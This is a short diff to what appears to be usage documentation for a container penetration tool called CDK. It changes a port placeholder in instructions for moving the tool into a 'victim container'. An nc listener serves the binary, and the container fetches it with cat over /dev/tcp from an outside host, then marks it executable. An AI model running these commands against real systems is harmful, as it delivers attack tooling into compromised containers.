@@ -34,7 +34,7 @@ nc -lvp 999 < cdk
 
 2. Inside the victim container execute
 ```
-cat < /dev/tcp/(your_public_host_ip)/(port) > cdk
+cat < /dev/tcp/(your_public_host_ip)/999 > cdk
 chmod a+x cdk
 ```
 
